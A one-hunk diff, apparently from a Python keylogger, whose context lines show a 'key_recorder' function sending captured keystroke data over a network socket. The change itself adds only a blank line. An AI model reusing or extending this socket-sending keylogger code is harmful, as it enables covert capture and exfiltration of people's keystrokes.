@@ -9,6 +9,7 @@ def key_recorder(key):
     mi_socket.send(str.encode(mensaje))
     mi_socket.close()
     
+    
 
 
 
